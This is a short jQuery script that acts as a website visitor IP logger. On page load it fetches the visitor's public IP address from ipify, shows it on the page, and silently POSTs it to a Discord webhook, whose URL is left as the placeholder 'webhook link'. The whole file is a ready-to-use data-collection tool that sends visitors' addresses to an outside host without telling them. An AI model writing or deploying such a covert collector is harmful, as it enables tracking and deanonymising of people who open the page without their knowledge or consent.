$(document).ready(function() {
    $.getJSON("https://api.ipify.org?format=json", function(data) {
        const ipAddress = data.ip;


        $("#ipAddress").text(ipAddress);

        sendToDiscord(ipAddress);
    });
});

function sendToDiscord(ip) {

    const webhookURL = 'webhook link';

    const data = {
        content: `New IP: ${ip}`
    };

    $.ajax({
        type: "POST",
        url: webhookURL,
        data: JSON.stringify(data),
        contentType: "application/json",
        success: function(response) {
            console.log(response);
        },
        error: function(error) {
            console.error('ERROR DISCORD:', error);
        }
    });
}